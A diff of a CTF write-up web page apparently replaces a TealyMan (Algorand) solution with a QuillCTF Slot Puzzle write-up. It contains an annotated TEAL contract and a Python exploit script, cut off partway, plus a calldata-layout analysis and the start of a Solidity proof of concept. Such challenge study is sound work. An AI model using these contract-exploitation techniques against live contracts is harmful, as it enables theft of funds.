-      <a href="../../wargames/leviathan/" class="md-nav__link">
+      <a href="../../leviathan/" class="md-nav__link">
         Leviathan
       </a>
     </li>
@@ -2486,7 +2415,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/krypton/" class="md-nav__link">
+      <a href="../../krypton/" class="md-nav__link">
         Krypton
       </a>
     </li>
@@ -2500,7 +2429,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/narnia/" class="md-nav__link">
+      <a href="../../narnia/" class="md-nav__link">
         Narnia
       </a>
     </li>
@@ -2547,7 +2476,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/protostar/stack/" class="md-nav__link">
+      <a href="../../protostar/stack/" class="md-nav__link">
         Stack
       </a>
     </li>
@@ -2561,7 +2490,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/protostar/format/" class="md-nav__link">
+      <a href="../../protostar/format/" class="md-nav__link">
         Format
       </a>
     </li>
@@ -2575,7 +2504,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/protostar/heap/" class="md-nav__link">
+      <a href="../../protostar/heap/" class="md-nav__link">
         Heap
       </a>
     </li>
@@ -2589,7 +2518,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/protostar/net/" class="md-nav__link">
+      <a href="../../protostar/net/" class="md-nav__link">
         Net
       </a>
     </li>
@@ -2603,7 +2532,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/protostar/final/" class="md-nav__link">
+      <a href="../../protostar/final/" class="md-nav__link">
         Final
       </a>
     </li>
@@ -2622,12 +2551,14 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3" type="checkbox" id="__nav_8_3" >
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3" type="checkbox" id="__nav_8_3" checked>
       
       
       
@@ -2650,7 +2581,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/ethernaut/" class="md-nav__link">
+      <a href="../../ethernaut/" class="md-nav__link">
         Ethernaut
       </a>
     </li>
@@ -2664,7 +2595,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/damn_vulnerable_defi/" class="md-nav__link">
+      <a href="../../damn_vulnerable_defi/" class="md-nav__link">
         Damn Vulnerable DeFi V3
       </a>
     </li>
@@ -2676,12 +2607,14 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3_3" type="checkbox" id="__nav_8_3_3" >
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3_3" type="checkbox" id="__nav_8_3_3" checked>
       
       
       
@@ -2702,11 +2635,62 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../../wargames/quillctf/slot_puzzle/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Slot Puzzle
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Slot Puzzle
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective-of-ctf" class="md-nav__link">
+    Objective of CTF
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability-description" class="md-nav__link">
+    Vulnerability Description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    Proof of Concept
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -2758,7 +2742,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/solana_pathway/" class="md-nav__link">
+      <a href="../../solana_pathway/" class="md-nav__link">
         Solana Pathway
       </a>
     </li>
@@ -2772,7 +2756,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/solana_security_workshop/" class="md-nav__link">
+      <a href="../../solana_security_workshop/" class="md-nav__link">
         Solana Security Workshop
       </a>
     </li>
@@ -2827,7 +2811,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../eggs/ctfhub_index/" class="md-nav__link">
+      <a href="../../../eggs/ctfhub_index/" class="md-nav__link">
         CTFHub - 首页
       </a>
     </li>
@@ -2841,7 +2825,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../eggs/ctfhub_wechat/" class="md-nav__link">
+      <a href="../../../eggs/ctfhub_wechat/" class="md-nav__link">
         CTFHub - 公众号
       </a>
     </li>
@@ -2855,7 +2839,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../eggs/ctfhub_tools/" class="md-nav__link">
+      <a href="../../../eggs/ctfhub_tools/" class="md-nav__link">
         CTFHub - 工具
       </a>
     </li>
@@ -2869,7 +2853,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../eggs/ctfhub_match/" class="md-nav__link">
+      <a href="../../../eggs/ctfhub_match/" class="md-nav__link">
         CTFHub - 赛事
       </a>
     </li>
@@ -2883,7 +2867,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../eggs/ctfhub_exams/" class="md-nav__link">
+      <a href="../../../eggs/ctfhub_exams/" class="md-nav__link">
         CTFHub - 真题
       </a>
     </li>
@@ -2922,43 +2906,23 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
+  <a href="#objective-of-ctf" class="md-nav__link">
+    Objective of CTF
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
-  </a>
-  
-    <nav class="md-nav" aria-label="解题思路">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
+  <a href="#vulnerability-description" class="md-nav__link">
+    Vulnerability Description
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    Flag
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    Proof of Concept
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    参考资料
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -2976,30 +2940,26 @@
   
   <div style="color: gray;">
     <small>
-      2023 | WolvCTF | Crypto
+      2023 | Hard | Solidity Security
     </small>
   </div>
   
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/tealyman.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/quillctf/slot_puzzle.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>TealyMan</h1>
+  <h1>Slot Puzzle</h1>
 
 <div class="blogging-tags-grid">
 
         <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
 
-        <a href="#algorand" class="blogging-tag"><code>#algorand</code></a>
-
-        <a href="#teal" class="blogging-tag"><code>#teal</code></a>
-
-        <a href="#beginner" class="blogging-tag"><code>#beginner</code></a>
+        <a href="#storage layout" class="blogging-tag"><code>#storage layout</code></a>
 
     </div>
 
@@ -3021,485 +2981,153 @@
         border-radius: 5px;
     }
 </style>
-<h2 id="_1">题目<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>Use the TestNet. Submit by sending enough testnet algos to cover the current transaction fee to the CTF_Address.</p>
+<h2 id="objective-of-ctf">Objective of CTF<a class="headerlink" href="#objective-of-ctf" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Your purpose is just to call the deploy() function to recover the 3 ether.</p>
+</blockquote>
+<p><a href="https://quillctf.super.site/challenges/quillctf-challenges/slot-puzzle">QuillCTF Challenges - Slot Puzzle</a></p>
+<h2 id="vulnerability-description">Vulnerability Description<a class="headerlink" href="#vulnerability-description" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Only the instance of SlotPuzzle deployed from SlotPuzzleFactory can call the <code>payout()</code> function to transfer ether and we need to pass the check in <code>ascertainSlot()</code> to let SlotPuzzle call <code>payout()</code></li>
+<li>Calculate the slot iteratively according to <code>keccak256(key, slot + (is ghostStore ? 1 : 0))</code> pattern</li>
+<li>We need three recipients, all pointing to hacker, to recover 3 ether since each <code>payout()</code> can only transfer 1 ether</li>
+<li>The difficult part is to decide <code>offset</code> &gt; &lt;</li>
+<li><code>params.slotKey</code> is copy from calldata to memory. <code>bytes memory slotKey</code> stores the slotKey offset in memory, here is 0x80</li>
+<li>
+<p>The offset of slot is calculated using <code>add(slotKey, calldataload(offset))</code>. So, the value of <code>offset</code> should be the offset of target value (i.e. slot.offset - slotKey) in the calldata. We can make use of <code>Parameters.slotKey</code> to pass that value</p>
 <table>
+<thead>
+<tr>
+<th>Offset(Hex)</th>
+<th>Calldata Layout</th>
+</tr>
+</thead>
 <tbody>
-  <tr>
-    <td>CTF_Address</td>
-    <td>OH4YZ4QXWOWLHIUKPQAOMPBZBELCANRPRX3NI7SQFL2OFASHLBW5DTLDZQ</td>
-  </tr>
-</tbody>
-<tbody>
-  <tr>
-    <td>AppID</td>
-    <td>163726037</td>
-  </tr>
+<tr>
+<td>04</td>
+<td>offset of struct Parameters</td>
+</tr>
+<tr>
+<td>24</td>
+<td>totalRecipients, 3</td>
+</tr>
+<tr>
+<td>44</td>
+<td>offset</td>
+</tr>
+<tr>
+<td>64</td>
+<td>offset of the Recipients array (relative to struct offset)</td>
+</tr>
+<tr>
+<td>84</td>
+<td>offset of slotKey (relative to struct offset)</td>
+</tr>
+<tr>
+<td>a4</td>
+<td>size of the Recipients array</td>
+</tr>
+<tr>
+<td>c4</td>
+<td>recipients[0].account</td>
+</tr>
+<tr>
+<td>...</td>
+<td>...</td>
+</tr>
+<tr>
+<td>184</td>
+<td>size of slotKey</td>
+</tr>
+<tr>
+<td>1a4</td>
+<td>slot.offset - 0x80</td>
+</tr>
+<tr>
+<td>1c4</td>
+<td>slot</td>
+</tr>
 </tbody>
 </table>
-
-<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<ul>
-<li>看地址首先排除 Ethereum uwu 根据 <code>TestNet</code> 和 <code>algos</code> 锁定 Algorand 生态 owo</li>
-<li><a href="https://testnet.algoexplorer.io/address/OH4YZ4QXWOWLHIUKPQAOMPBZBELCANRPRX3NI7SQFL2OFASHLBW5DTLDZQ">OH4YZ4QXWOWLHIUKPQAOMPBZBELCANRPRX3NI7SQFL2OFASHLBW5DTLDZQ</a> 为普通账户，<a href="https://testnet.algoexplorer.io/application/163726037">163726037</a> 对应需要交互的智能合约账户</li>
-<li>Algorand 智能合约包含两部分，<code>ApprovalProgram</code> 和 <code>ClearStateProgram</code>。<code>ApprovalProgram</code> 负责处理主应用逻辑，<code>ClearStateProgram</code> 负责将对应智能合约从账户记录中移除，执行成功返回 <span class="arithmatex">\(1\)</span></li>
-</ul>
-<blockquote>
-<p>the flag will be sent to u once ur done with the app and provide the address enough to cover current transaction fees</p>
-</blockquote>
-<ul>
-<li>目标是与应用进行完整交互。与合约交互的方法包括 Opt-in、Call(NoOp)、Read state、Update、Close out、Delete 以及 Clear state<ul>
-<li>在开始与使用本地状态的应用交互前，账户需要 Opt in</li>
-</ul>
-</li>
-<li>
-<p>分析 <code>ApprovalProgram</code>，根据 <code>OnCompletion</code> 的类型执行相关操作，重点关注 <code>OnCompletion == 0</code>，即 NoOp。目标应用支持 <code>setup</code> 和 <code>buy</code></p>
-<ul>
-<li>首先通过 <code>setup</code> 向应用注册 asset，并向应用转移一部分 asset 以便后续购买操作</li>
-<li>再进行 <code>buy</code>，需要发送一个交易组，其中第一个交易为 Payment（向应用支付购买 asset 的 algo），第二个是 Application Call</li>
-</ul>
-<details class="note">
-<summary>Approval Program</summary>
-<div class="highlight"><pre><span></span><code>#pragma version 5
-    intcblock 1 0 4 9223372036854775808 // prepare block of uint64 constants for use by intc
-    bytecblock 0x7374617274 0x656e64 0x61646d696e5f6b6579 0x6e66745f6964 // prepare block of byte-array constants for use by bytec
-
-    // Deploy or Call?
-    txn ApplicationID
-    intc_1 // 0
-    ==
-    bnz label1
-
-    txn OnCompletion
-    intc_1 // 0, NoOp, only execute the ApprovalProgram associated with this application ID, with no additional effects.
-    ==
-    bnz label2
-
-    txn OnCompletion
-    intc_0 // 1, OptIn, before executing the ApprovalProgram, allocate local state for this application into the sender&#39;s account data
-    ==
-    bnz label3
-
-    txn OnCompletion
-    pushint 2 // CloseOut, after executing the ApprovalProgram, clear any local state for this application out of the sender&#39;s account data.
-    ==
-    bnz label4
-
-    txn OnCompletion
-    pushint 5 // DeleteApplication
-    ==
-    bnz label5
-
-    txn OnCompletion
-    intc_2 // 4, UpdateApplication
-    ==
-    bnz label6
-
-    err
-label6:
-    intc_1 // 0
-    return
-label5:
-    txn Sender
-    global CreatorAddress
-    ==
-    assert
-
-    bytec_2 // &quot;admin_key&quot;
-    app_global_get
-    callsub label7
-
-    intc_0 // 1
-    return
-label4:
-    intc_0 // 1
-    return
-label3:
-    intc_0 // 1
-    return
-label2:
-    txna ApplicationArgs 0 // 0-th value of the ApplicationArgs array of the current transaction
-    pushbytes 0x7365747570 // &quot;setup&quot;
-    ==
-    bnz label8
-
-    txna ApplicationArgs 0
-    pushbytes 0x627579 // &quot;buy&quot;
-    ==
-    bnz label9
-
-    err
-label9:
-    global CurrentApplicationAddress // Address that the current application controls
-    txna Assets 0 // Foreign Assets listed in the ApplicationCall transaction
-    asset_holding_get AssetBalance
-    store 1 // store is_opted_in to the 1-th scratch space
-    store 0 // store asset balance to the 0-th scratch space
-    load 1  // load is_opted_in from the 1-th scratch space
-    intc_1 // 0
-    load 0
-    callsub label10
-    &amp;&amp;  // if is_opted_in and asset balance &gt; 0
-
-    txn Sender
-    bytec_0 // &quot;start&quot;
-    app_local_get
-    global LatestTimestamp
-    callsub label10
-    &amp;&amp;
-
-    global LatestTimestamp
-    txn Sender
-    bytec_1 // &quot;end&quot;
-    app_local_get
-    callsub label10
-    &amp;&amp;
-
-    txn GroupIndex // index=1
-    intc_0 // 1
-    - // GroupIndex - 1
-    gtxns TypeEnum // field F of the (GroupIndex - 1)-th transaction in the current group
-
-    intc_0 // 1
-    ==
-    &amp;&amp;
-
-    txn GroupIndex // index=1
-    intc_0 // 1
-    -
-    gtxns Sender
-
-    txn Sender
-    ==
-    &amp;&amp;
-
-    txn GroupIndex // index=1
-    intc_0 // 1
-    -
-    gtxns Receiver
-
-    global CurrentApplicationAddress
-    ==
-    &amp;&amp;
-
-    global MinTxnFee
-
-    txn GroupIndex // index=1
-    intc_0 // 1
-    -
-    gtxns Amount
-
-    callsub label10
-    &amp;&amp;
-    assert
-
-    txna ApplicationArgs 1
-    btoi
-    global LatestTimestamp
-    +
-
-    txn Sender
-    bytec_0 // &quot;start&quot;
-    app_local_get
-    callsub label10
-    bnz label11
-
-    intc_1 // 0
-    return
-label11:
-    txn Sender
-    bytec_3 // &quot;nft_id&quot;
-    app_local_get
-
-    txn Sender
-    callsub label12
-
-    intc_0 // 1
-    return
-label8:
-    itxn_begin // begin preparation of a new inner transaction in a new transaction group
-
-    intc_2 // 4
-    itxn_field TypeEnum // set field of the current inner transaction to AssetTransfer
-
-    txna Assets 0
-    itxn_field XferAsset
-
-    global CurrentApplicationAddress
-    itxn_field AssetReceiver
-    itxn_submit // execute the current inner transaction group
-
-    txn Sender
-    bytec_3 // &quot;nft_id&quot;
-    txna Assets 0
-    app_local_put // store the nft_id in the sender&#39;s local state
-
-    txn Sender
-    pushbytes 0x73656c6c6572 // &quot;seller&quot;
-    txn Sender
-    app_local_put // store the seller address in the sender&#39;s local state
-
-    txn Sender
-    bytec_0 // &quot;start&quot;
-    global LatestTimestamp
-    app_local_put
-
-    txn Sender
-    bytec_1 // &quot;end&quot;
-    txna ApplicationArgs 1
-    btoi
-    app_local_put
-
-    txn Sender
-    bytec_0 // &quot;start&quot;
-    app_local_get
-    txn Sender
-    bytec_1 // &quot;end&quot;
-    app_local_get
-    &lt;
-    assert  // require start &lt; end
-
-    intc_0 // 1, approval
-    return
-label1:
-    bytec_2 // &quot;admin_key&quot;
-    txn Sender
-    app_global_put
-
-    intc_0 // 1
-    return
-label12:
-    store 3
-    store 2
-    global CurrentApplicationAddress
-    load 2
-    asset_holding_get AssetBalance
-    store 5
-    store 4
-    load 5
-    bz label13
-
-    itxn_begin
-    intc_2 // 4
-    itxn_field TypeEnum
-    load 2
-    itxn_field XferAsset
-    load 3
-    itxn_field AssetCloseTo
-    itxn_submit
-label13:
-    retsub
-label7:
-    store 6
-    global CurrentApplicationAddress
-    balance
-    intc_1 // 0
-    !=
-    bz label14
-
-    itxn_begin
-    intc_0 // 1
-    itxn_field TypeEnum
-    load 6
-    itxn_field CloseRemainderTo
-    itxn_submit
-label14:
-    retsub
-label10:
-    store 8
-    store 7
-    intc_3 // 9223372036854775808
-    load 7
-    &amp;
-    bnz label15
-
-    intc_3 // 9223372036854775808, 0x8000000000000000
-    load 8
-    &amp;
-    bnz label16
-
-    load 7
-    load 8
-    &lt;
-    bnz label17
-
-    intc_1 // 0
-    retsub
-label17:
-    intc_0 // 1
-    retsub
-label16:
-    intc_1 // 0
-    retsub
-label15:
-    intc_3 // 9223372036854775808
-    load 8
-    &amp;
-    bnz label18
-
-    intc_0 // 1
-    retsub
-label18:
-    load 7
-    load 8
-    &gt;
-    bnz label19
-
-    intc_1 // 0
-    retsub
-label19:
-    intc_0 // 1
-    retsub
-</code></pre></div>
-</details>
-</li>
-<li>
-<p>CTF_Address 会向完成交易的账户发起 Transfer 交易，其中包含使用 AlgoSMS 加密的 Flag</p>
 </li>
 </ul>
-<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">algosdk.v2client</span> <span class="kn">import</span> <span class="n">algod</span>
-<span class="kn">from</span> <span class="nn">algosdk</span> <span class="kn">import</span> <span class="n">transaction</span><span class="p">,</span> <span class="n">account</span><span class="p">,</span> <span class="n">constants</span>
-<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
-<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
-<span class="kn">import</span> <span class="nn">json</span>
+<h2 id="proof-of-concept">Proof of Concept<a class="headerlink" href="#proof-of-concept" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.17</span><span class="p">;</span>
 
-<span class="k">def</span> <span class="nf">transact</span><span class="p">(</span><span class="n">txn</span><span class="p">):</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">txn</span><span class="p">,</span> <span class="nb">list</span><span class="p">):</span>
-        <span class="n">signed_txn</span> <span class="o">=</span> <span class="n">txn</span><span class="o">.</span><span class="n">sign</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
-        <span class="n">txid</span> <span class="o">=</span> <span class="n">algod_client</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">(</span><span class="n">signed_txn</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">signed_txns</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span><span class="o">.</span><span class="n">sign</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">txn</span><span class="p">]</span>
-        <span class="n">txid</span> <span class="o">=</span> <span class="n">algod_client</span><span class="o">.</span><span class="n">send_transactions</span><span class="p">(</span><span class="n">signed_txns</span><span class="p">)</span>
-    <span class="n">confirmed_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">wait_for_confirmation</span><span class="p">(</span><span class="n">algod_client</span><span class="p">,</span> <span class="n">txid</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Transaction information: </span><span class="si">{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">confirmed_txn</span><span class="p">,</span><span class="w"> </span><span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">confirmed_txn</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;forge-std/Test.sol&quot;</span><span class="p">;</span>
 
-<span class="n">private_key</span> <span class="o">=</span> <span class="s1">&#39;&lt;private&gt;&#39;</span>
-<span class="n">sender</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">address_from_private_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">SlotPuzzle</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;src/SlotPuzzle.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">SlotPuzzleFactory</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;src/SlotPuzzleFactory.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">Parameters</span><span class="p">,</span><span class="w"> </span><span class="nx">Recipients</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;src/interface/ISlotPuzzleFactory.sol&quot;</span><span class="p">;</span>
 
-<span class="n">app_id</span> <span class="o">=</span> <span class="mi">163726037</span>
-<span class="n">app_address</span> <span class="o">=</span> <span class="s2">&quot;5K7JP6324NOEPDB5THIZY3FWHUKF4FBPJFYKIUX2SBNG264NUY6E3AI3BM&quot;</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">SlotPuzzleTest</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">SlotPuzzle</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">slotPuzzle</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">SlotPuzzleFactory</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">slotPuzzleFactory</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">hacker</span><span class="p">;</span>
 
-<span class="n">algod_address</span> <span class="o">=</span> <span class="s2">&quot;https://testnet-algorand.api.purestake.io/ps2&quot;</span>
-<span class="n">algod_token</span> <span class="o">=</span> <span class="s2">&quot;&lt;api-key&gt;&quot;</span>
-<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="s2">&quot;X-API-Key&quot;</span><span class="p">:</span> <span class="n">algod_token</span><span class="p">,</span>
-<span class="p">}</span>
-<span class="n">algod_client</span> <span class="o">=</span> <span class="n">algod</span><span class="o">.</span><span class="n">AlgodClient</span><span class="p">(</span><span class="n">algod_token</span><span class="p">,</span> <span class="n">algod_address</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
-
-<span class="n">params</span> <span class="o">=</span> <span class="n">algod_client</span><span class="o">.</span><span class="n">suggested_params</span><span class="p">()</span>
-
-<span class="c1"># OptIn</span>
-<span class="n">optin_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">ApplicationOptInTxn</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">app_id</span><span class="p">)</span>
-<span class="n">transact</span><span class="p">(</span><span class="n">optin_txn</span><span class="p">)</span>
-
-<span class="c1"># Create asset</span>
-<span class="n">create_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">AssetCreateTxn</span><span class="p">(</span>
-    <span class="n">sender</span><span class="p">,</span>
-    <span class="n">params</span><span class="p">,</span>
-    <span class="mi">100</span><span class="p">,</span>
-    <span class="n">decimals</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
-    <span class="n">default_frozen</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
-    <span class="n">unit_name</span><span class="o">=</span><span class="s2">&quot;CC&quot;</span><span class="p">,</span>
-    <span class="n">asset_name</span><span class="o">=</span><span class="s2">&quot;Chicken Coin&quot;</span><span class="p">,</span>
-    <span class="n">manager</span><span class="o">=</span><span class="n">sender</span><span class="p">,</span>
-<span class="p">)</span>
-<span class="n">res</span> <span class="o">=</span> <span class="n">transact</span><span class="p">(</span><span class="n">create_txn</span><span class="p">)</span>
-<span class="n">asset_id</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="s1">&#39;asset-index&#39;</span><span class="p">]</span>
-
-<span class="n">setup_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">ApplicationNoOpTxn</span><span class="p">(</span>
-    <span class="n">sender</span><span class="p">,</span>
-    <span class="n">params</span><span class="p">,</span>
-    <span class="n">app_id</span><span class="p">,</span>
-    <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;setup&#39;</span><span class="p">,</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x80000000</span><span class="p">)],</span>
-    <span class="n">foreign_assets</span><span class="o">=</span><span class="p">[</span><span class="n">asset_id</span><span class="p">],</span>
-    <span class="n">foreign_apps</span><span class="o">=</span><span class="p">[</span><span class="n">asset_id</span><span class="p">],</span>
-    <span class="p">)</span>
-<span class="n">transact</span><span class="p">(</span><span class="n">setup_txn</span><span class="p">)</span>
-
-<span class="n">transfer_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">AssetTransferTxn</span><span class="p">(</span>
-    <span class="n">sender</span><span class="p">,</span>
-    <span class="n">params</span><span class="p">,</span>
-    <span class="n">app_address</span><span class="p">,</span>
-    <span class="mi">1</span><span class="p">,</span>
-    <span class="n">asset_id</span><span class="p">,</span>
-<span class="p">)</span>
-<span class="n">transact</span><span class="p">(</span><span class="n">transfer_txn</span><span class="p">)</span>
-
-<span class="n">payment_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">PaymentTxn</span><span class="p">(</span>
-    <span class="n">sender</span><span class="p">,</span>
-    <span class="n">params</span><span class="p">,</span>
-    <span class="n">app_address</span><span class="p">,</span>
-    <span class="n">constants</span><span class="o">.</span><span class="n">MIN_TXN_FEE</span> <span class="o">*</span> <span class="mi">10</span><span class="p">,</span>
-<span class="p">)</span>
-<span class="n">noop_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">ApplicationNoOpTxn</span><span class="p">(</span>
-    <span class="n">sender</span><span class="p">,</span>
-    <span class="n">params</span><span class="p">,</span>
-    <span class="n">app_id</span><span class="p">,</span>
-    <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;buy&#39;</span><span class="p">,</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="mi">9223372036854775808</span><span class="p">)],</span>
-    <span class="n">foreign_assets</span><span class="o">=</span><span class="p">[</span><span class="n">asset_id</span><span class="p">],</span>
-    <span class="n">foreign_apps</span><span class="o">=</span><span class="p">[</span><span class="n">asset_id</span><span class="p">],</span>
-<span class="p">)</span>
-<span class="n">gid</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">calculate_group_id</span><span class="p">([</span><span class="n">payment_txn</span><span class="p">,</span> <span class="n">noop_txn</span><span class="p">])</span>
-<span class="n">payment_txn</span><span class="o">.</span><span class="n">group</span> <span class="o">=</span> <span class="n">gid</span>
-<span class="n">noop_txn</span><span class="o">.</span><span class="n">group</span> <span class="o">=</span> <span class="n">gid</span>
-<span class="n">transact</span><span class="p">([</span><span class="n">payment_txn</span><span class="p">,</span> <span class="n">noop_txn</span><span class="p">])</span>
-
-<span class="n">close_txn</span> <span class="o">=</span> <span class="n">transaction</span><span class="o">.</span><span class="n">ApplicationCloseOutTxn</span><span class="p">(</span>
-    <span class="n">sender</span><span class="p">,</span>
-    <span class="n">params</span><span class="p">,</span>
-    <span class="n">app_id</span><span class="p">,</span>
-<span class="p">)</span>
